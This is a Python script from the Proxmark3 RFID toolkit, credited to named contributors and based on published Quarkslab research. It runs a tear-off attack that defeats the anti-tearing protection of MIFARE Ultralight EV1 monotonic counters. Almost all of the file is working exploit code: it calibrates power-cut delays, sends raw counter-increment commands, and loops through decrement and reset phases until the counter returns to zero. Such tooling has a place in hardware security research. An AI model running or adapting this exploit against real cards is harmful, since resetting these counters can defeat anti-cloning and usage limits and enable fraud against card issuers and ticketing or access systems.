#!/usr/bin/env python3
#-----------------------------------------------------------------------------
# Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# See LICENSE.txt for the text of the license.
#-----------------------------------------------------------------------------
# Bypass Anti-Tearing on MIFARE Ultralight EV1 monotonic counters (tear-off).
# Script version: 2.0.0
# Created by W0rthlessS0ul (https://github.com/W0rthlessS0ul)
# Based on Quarkslab research: https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html
# Updated by M35MAR (https://github.com/M35mar)
#-----------------------------------------------------------------------------

import argparse
import os
import re
import sys
import threading
import time

import pm3

try:
    from colors import color
except ModuleNotFoundError:
    def color(text, fg=None):
        _ = fg
        return str(text)

PROGRAM_NAME = os.path.basename(sys.argv[0])

# Known EV1 limits / artifacts
COUNTER_MAX = 0xFFFFFF
COUNTER_PREPARE_TARGET = 0x00FFFF
TEAR_STUCK_VALUE = 6           # counter may be read as 6 after a failed tear

# Calibration and delay tuning
DELAY_BD_MIN = 2700
DELAY_BD_MAX = 5000
CAL_STEP_US = 5
DELAY_00_OFFSET = 10           # delay_00 = BD - this offset
DELAY_TUNE_STEP = 1
DELAY_TUNE_JUMP = 10

RETRY_COUNT = 3
RETRY_SLEEP_S = 0.2
TEAR_REPAIR_ATTEMPTS = 5

ANSI_ESCAPE = re.compile(r"\x1b\[[0-9;]*m")
PM3_PAYLOAD_RE = re.compile(r"\[\+\]\s+([^\n\[]+)")
NACK_BYTES = frozenset({"04", "05", "06", "0A", "0a"})

p = pm3.pm3()


def build_parser():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        prog=color(f"\n  script run {PROGRAM_NAME}", "red"),
        epilog=(
            color("examples:\n", "green")
            + color(
                f"  script run {PROGRAM_NAME} -c 0\n"
                f"  script run {PROGRAM_NAME} -c 0 -f\n"
                f"  script run {PROGRAM_NAME} -c 0 --DelayBD 2720 --Delay00 2705",
                "yellow",
            )
        ),
    )
    parser.add_argument("-c", "--cnt", metavar="", default="0", help="Counter index (0-2)")
    parser.add_argument("-f", "--force", action="store_true", help="Skip pre-flight checks")
    parser.add_argument("--DelayBD", metavar="", type=int, help="Manual BD delay (us, disables auto-calibration)")
    parser.add_argument("--Delay00", metavar="", type=int, help="Manual 00 delay (us)")
    return parser


def print_help(parser):
    help_text = parser.format_help()
    help_text = help_text.replace(
        "usage:",
        f"\n{color('Counter reset of Mifare UL EV1 cards', 'cyan')}\n\nusage:",
    )
    help_text = help_text.replace("options:", color("options:", "green")).replace(
        "usage:", color("usage:", "green")
    )
    print(help_text)


def strip_ansi(text: str) -> str:
    return ANSI_ESCAPE.sub("", str(text))


def extract_pm3_payload(output: str) -> str:
    """Return hex bytes from the last Proxmark3 [+] line, before the CRC bracket."""
    clean = strip_ansi(output)
    matches = PM3_PAYLOAD_RE.findall(clean)
    if not matches:
        return ""
    line = matches[-1].strip()
    if " [" in line:
        line = line.split(" [ ", 1)[0]
    return line.strip()


def format_counter_hex(counter_int: int) -> str:
    return counter_int.to_bytes(3, byteorder="little").hex()


def int_to_incr_bytes(value: int) -> str:
    """Return 6 hex chars, little-endian (LSB first) for INCR_CNT."""
    return value.to_bytes(3, byteorder="little").hex()


def run_pm3(cmd: str, *, capture: bool = True) -> str:
    p.console(cmd, capture=capture, quiet=True)
    return strip_ansi(str(p.grabbed_output))


def wake_card() -> None:
    run_pm3("hf 14a reader")


def parse_counter_output(output: str):
    payload = extract_pm3_payload(output)
    if not payload:
        return None, None

    parts = payload.split()
    if len(parts) == 1:
        # Single-byte reply is usually a NACK, not a 24-bit counter.
        if parts[0] in NACK_BYTES:
            return None, None
        return None, None

    if len(parts) < 3:
        return None, None

    try:
        counter_bytes = bytes(int(part, 16) for part in parts[:3])
    except ValueError:
        return None, None

    counter_int = int.from_bytes(counter_bytes, byteorder="little")
    return format_counter_hex(counter_int), counter_int


def parse_tearing_output(output: str):
    payload = extract_pm3_payload(output)
    if not payload:
        return False, "?"

    tearing = payload.split()[0].upper()
    return tearing == "BD", tearing


def read_counter(counter_index: str):
    for _ in range(RETRY_COUNT):
        output = run_pm3(f"hf 14a raw -s -c 39 0{counter_index}")
        counter_hex, counter_int = parse_counter_output(output)
        if counter_hex is not None:
            return counter_hex, counter_int
        wake_card()
        time.sleep(RETRY_SLEEP_S)
    return None, None


def check_tearing_event(counter_index: str):
    for _ in range(RETRY_COUNT):
        output = run_pm3(f"hf 14a raw -s -c 3E 0{counter_index}")
        try:
            return parse_tearing_output(output)
        except (IndexError, ValueError):
            time.sleep(RETRY_SLEEP_S)
    return False, "?"


def enable_tearoff(delay_us: int) -> bool:
    run_pm3(f"hw tearoff --delay {delay_us}")
    output = run_pm3("hw tearoff --on")
    return "enabled" in output.lower()


def disable_tearoff() -> None:
    run_pm3("hw tearoff --off")


def incr_cnt(counter_index: str, payload_hex: str) -> None:
    run_pm3(f"hf 14a raw -s -c A5 0{counter_index} {payload_hex} 00")


def repair_tear_flag(counter_index: str) -> bool:
    wake_card()
    for _ in range(TEAR_REPAIR_ATTEMPTS):
        _, tearing = check_tearing_event(counter_index)
        if tearing in ("00", "BD"):
            return True
        incr_cnt(counter_index, "000000")
        incr_cnt(counter_index, "000000")
        time.sleep(RETRY_SLEEP_S)

    print(f"[{color('!', 'yellow')}] Attempting tear-off repair...")
    enable_tearoff(2950)
    incr_cnt(counter_index, "010000")
    time.sleep(RETRY_SLEEP_S)
    wake_card()
    _, tearing = check_tearing_event(counter_index)
    return tearing in ("00", "BD")


def normalize_tear_flag(counter_index: str) -> None:
    for _ in range(TEAR_REPAIR_ATTEMPTS * 2):
        if check_tearing_event(counter_index)[1] in ("00", "BD"):
            return
        incr_cnt(counter_index, "000000")


def run_decrement_step(counter_index: str, delay_bd: int, delay_00: int) -> None:
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, "000100")
    enable_tearoff(delay_00)
    incr_cnt(counter_index, "000000")
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, "000000")
    enable_tearoff(delay_00)
    incr_cnt(counter_index, "000000")
    normalize_tear_flag(counter_index)


def run_reset_step(counter_index: str, delay_bd: int, delay_00: int) -> None:
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, "010000")
    enable_tearoff(delay_00)
    incr_cnt(counter_index, "000000")
    normalize_tear_flag(counter_index)


def tune_delay(delay_bd: int, previous_counter: int, current_counter: int, locked: bool) -> int:
    if locked:
        return delay_bd
    if current_counter == previous_counter:
        return delay_bd + DELAY_TUNE_STEP
    if current_counter - previous_counter > DELAY_TUNE_JUMP:
        return max(DELAY_BD_MIN, delay_bd - DELAY_TUNE_STEP)
    return delay_bd


def is_ev1_card() -> bool:
    wake_card()
    output = run_pm3("hf 14a raw -s -c 60")
    payload = extract_pm3_payload(output)
    parts = payload.split()
    if len(parts) >= 5 and parts[4].upper() == "01":
        return True

    info_output = run_pm3("hf mfu info").lower()
    return any(
        marker in info_output
        for marker in (
            "ul ev1",
            "ultralight ev1",
            "ul-ev1",
            "major version: 01",
            "mfu ev1",
        )
    )


def preflight_checks(counter_index: str) -> bool:
    wake_card()
    if not is_ev1_card():
        print(f"[{color('!', 'red')}] Support only Mifare UL EV1 cards")
        return False

    if not repair_tear_flag(counter_index):
        _, tearing = check_tearing_event(counter_index)
        print(f"[{color('!', 'red')}] Could not repair tear flag (got 0x{tearing})")
        return False

    _, tearing = check_tearing_event(counter_index)
    if tearing not in ("00", "BD"):
        print(f"[{color('!', 'red')}] Card does not support CHECK_TEARING_EVENT")
        return False

    _, counter = read_counter(counter_index)
    if counter is None:
        print(f"[{color('!', 'red')}] Cannot read initial counter")
        return False
    if counter == COUNTER_MAX:
        print(f"[{color('!', 'red')}] Counter is at maximum (0x{COUNTER_MAX:06X}), cannot reset")
        return False
    if counter == 0:
        print(f"[{color('!', 'red')}] Counter is already at minimum (0)")
        return False

    print(
        f"[{color('*', 'blue')}] Counter {counter_index}: "
        f"{counter} (0x{format_counter_hex(counter).upper()}) | Tear: 0x{tearing}"
    )
    return True


class StopListener:
    def __init__(self):
        self._stop = False
        self._thread = threading.Thread(target=self._run, daemon=True)

    @property
    def stopped(self) -> bool:
        return self._stop

    def start(self) -> None:
        self._thread.start()

    def stop(self) -> None:
        self._stop = True
        self._thread.join(timeout=1)

    def _run(self) -> None:
        if os.name == "nt":
            import msvcrt
            while not self._stop:
                if msvcrt.kbhit() and msvcrt.getch() == b"\r":
                    self._stop = True
                time.sleep(0.1)
            return

        import select
        while not self._stop:
            if select.select([sys.stdin], [], [], 0.1)[0] and sys.stdin.readline():
                self._stop = True


def calibrate_bd_delay(counter_index: str, stop: StopListener):
    """Return (delay_bd, delay_00) where delay_00 = delay_bd - 15 (fixed offset)."""
    best_bd = None

    for delay_bd in range(DELAY_BD_MIN, DELAY_BD_MAX, CAL_STEP_US):
        if stop.stopped:
            return best_bd, None

        initial_hex, initial_int = read_counter(counter_index)
        if initial_hex is None:
            repair_tear_flag(counter_index)
            continue

        enable_tearoff(delay_bd)
        incr_cnt(counter_index, "000000")
        check_tearing, tear_flag = check_tearing_event(counter_index)
        incr_cnt(counter_index, "000000")
        incr_cnt(counter_index, "000000")

        final_hex, final_int = read_counter(counter_index)
        if final_hex is None:
            repair_tear_flag(counter_index)
            continue

        tear_color = "green" if check_tearing else "red"
        stable = final_int == initial_int
        print(
            f"\r[{color('=', 'goldenrod')}] Testing delay: {color(delay_bd, 'yellow')} us | "
            f"Check tearing: {color(tear_flag, tear_color)} | "
            f"Counter: {color(initial_hex.upper(), 'yellow')} -> {color(final_hex.upper(), 'yellow')}",
            end="",
            flush=True,
        )

        if check_tearing:
            best_bd = delay_bd
            if stable:
                print(f"\n[{color('+', 'green')}] Working BD delay: {color(delay_bd, 'green')} us")
                delay_00 = max(DELAY_BD_MIN, delay_bd - DELAY_00_OFFSET)
                return delay_bd, delay_00

    if best_bd is not None:
        print(
            f"\n[{color('!', 'yellow')}] Counter drift during calibration; "
            f"using last BD delay: {color(best_bd, 'green')} us"
        )
        delay_00 = max(DELAY_BD_MIN, best_bd - DELAY_00_OFFSET)
        return best_bd, delay_00

    print(f"\n[{color('!', 'red')}] Auto-calibration failed; try manual --DelayBD 2720")
    return None, None


def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopListener) -> bool:
    phase = "decrement"
    attempt = 0
    reset_attempts = 0
    delay_locked = False

    _, baseline_counter = read_counter(counter_index)
    if baseline_counter is None:
        baseline_counter = 0

    tune_reference = baseline_counter
    reset_reference = baseline_counter

    while not stop.stopped:
        counter_hex, counter_int = read_counter(counter_index)
        if counter_hex is None:
            repair_tear_flag(counter_index)
            time.sleep(0.2)
            continue

        if counter_int == 0:
            print("\n[+] Exploit successful")
            return True

        if counter_int == TEAR_STUCK_VALUE:
            repair_tear_flag(counter_index)
            continue

        if phase == "decrement":
            if counter_int <= COUNTER_PREPARE_TARGET and counter_int != TEAR_STUCK_VALUE:
                print("\n[=] Switching to PREPARE phase (counter <= 0x00FFFF)")
                incr_cnt(counter_index, "000000")
                time.sleep(0.2)
                incr_cnt(counter_index, "000000")
                phase = "prepare"
                reset_reference = counter_int
                continue

            initial_hex, initial_int = counter_hex, counter_int
            run_decrement_step(counter_index, delay_bd, delay_00)

            if stop.stopped:
                break

            final_hex, final_int = read_counter(counter_index)
            if final_hex is None:
                continue

            if final_int == TEAR_STUCK_VALUE:
                continue

            _, tear_flag = check_tearing_event(counter_index)
            attempt += 1
            print(
                f"\r[{color('DEC', 'red')}] Att {attempt} | BD/00: {delay_bd}/{delay_00} us | "
                f"Tear: {tear_flag} | {initial_hex.upper()} -> {final_hex.upper()}  ",
                end="",
                flush=True,
            )

            if final_int < initial_int and final_int != TEAR_STUCK_VALUE:
                print(
                    f"\n[{color('+', 'green')}] Decrement! {initial_hex.upper()} -> "
                    f"{final_hex.upper()} (delta {initial_int - final_int})"
                )
                # Consolidate the drop
                incr_cnt(counter_index, "000000")
                time.sleep(0.2)
                incr_cnt(counter_index, "000000")
                normalize_tear_flag(counter_index)
                delay_locked = True
                tune_reference = final_int
                continue

            # Tuning logic
            if final_int > initial_int:
                if delay_locked:
                    delay_locked = False
                    tune_reference = final_int
                else:
                    new_delay = tune_delay(delay_bd, tune_reference, final_int, False)
                    if new_delay != delay_bd:
                        delay_bd = new_delay
                        # delay_00 is intentionally left unchanged
                    tune_reference = final_int
            else:
                if not delay_locked:
                    new_delay = tune_delay(delay_bd, tune_reference, final_int, False)
                    if new_delay != delay_bd:
                        delay_bd = new_delay
                    tune_reference = final_int

        elif phase == "prepare":
            if counter_int < COUNTER_PREPARE_TARGET and counter_int != TEAR_STUCK_VALUE:
                diff = COUNTER_PREPARE_TARGET - counter_int
                diff_hex = int_to_incr_bytes(diff)
                print(
                    f"\r[{color('PREPARE', 'yellow')}] Incrementing by {diff} to reach 0x{COUNTER_PREPARE_TARGET:06X}...",
                    end="",
                    flush=True,
                )
                incr_cnt(counter_index, diff_hex)
                incr_cnt(counter_index, "000000")
                continue

            if counter_int == COUNTER_PREPARE_TARGET:
                print(f"\n[=] Counter at 0x{COUNTER_PREPARE_TARGET:06X}, switching to RESET phase")
                phase = "reset"
                reset_attempts = 0
                reset_reference = COUNTER_PREPARE_TARGET
                delay_locked = False
                continue

            phase = "decrement"
            continue

        elif phase == "reset":
            initial_hex, initial_int = counter_hex, counter_int
            run_reset_step(counter_index, delay_bd, delay_00)

            if stop.stopped:
                break

            final_hex, final_int = read_counter(counter_index)
            if final_hex is None:
                continue

            if final_int == TEAR_STUCK_VALUE:
                continue

            reset_attempts += 1
            print(
                f"\r[{color('RESET', 'green')}] Att {reset_attempts} | BD/00: {delay_bd}/{delay_00} us | "
                f"{initial_hex.upper()} -> {final_hex.upper()}  ",
                end="",
                flush=True,
            )

            if final_int == 0:
                print(f"\n[+] {color('Exploit successful', 'green')}")
                return True

            if final_int > COUNTER_PREPARE_TARGET:
                print("\n[=] Counter increased, returning to DECREMENT")
                phase = "decrement"
                tune_reference = final_int
                delay_locked = False
                continue

            if final_int == initial_int:
                new_delay = tune_delay(delay_bd, reset_reference, final_int, False)
                if new_delay != delay_bd:
                    delay_bd = new_delay
                reset_reference = final_int
            elif final_int < initial_int:
                print(f"\n[{color('+', 'green')}] Reset decrement! {initial_hex} -> {final_hex}")
                delay_locked = True
                reset_reference = final_int
            # else final_int slightly higher but still within range – ignore

    return False


def main():
    print(color("Attack against the monotonic counters of MFU EV1 using the tear-off technique.", "cyan"))
    print(
        color(
            "Note: If the counter does not reset after a few attempts, increment it to 2^n and retry.",
            "cyan",
        )
    )
    print()

    if not args.force and not preflight_checks(args.cnt):
        print(
            f"[{color('?', 'goldenrod')}] Try `{color(f'script run {PROGRAM_NAME} -f', 'goldenrod')}` "
            "if this is a false negative"
        )
        return 1

    stop = StopListener()
    stop.start()

    success = False
    try:
        if args.DelayBD is None:
            result = calibrate_bd_delay(args.cnt, stop)
            if result[0] is None:
                return 1
            delay_bd, delay_00 = result
        else:
            delay_bd = args.DelayBD
            delay_00 = args.Delay00 if args.Delay00 is not None else delay_bd - DELAY_00_OFFSET
            print(f"[{color('+', 'green')}] Using manual BD delay: {color(delay_bd, 'green')} us")
            if args.Delay00 is not None:
                print(f"[{color('+', 'green')}] Using manual 00 delay: {color(delay_00, 'green')} us")

        if stop.stopped:
            print("\n[x] Interrupted by user.")
            return 0

        success = attack_loop(args.cnt, delay_bd, delay_00, stop)
        if success:
            return 0
        if stop.stopped:
            print("\n[x] Interrupted by user.")
            return 0
        return 1
    finally:
        stop.stop()
        disable_tearoff()
        sys.stdout.flush()


if __name__ == "__main__":
    parser = build_parser()
    if "-h" in sys.argv or "--help" in sys.argv:
        print_help(parser)
        sys.exit(0)

    args = parser.parse_args()

    try:
        sys.exit(main())
    except KeyboardInterrupt:
        disable_tearoff()
        print("\n[x] Interrupted.")
        sys.exit(0)
    except Exception as exc:
        disable_tearoff()
        print(f"\n[x] Error: {exc}")
        raise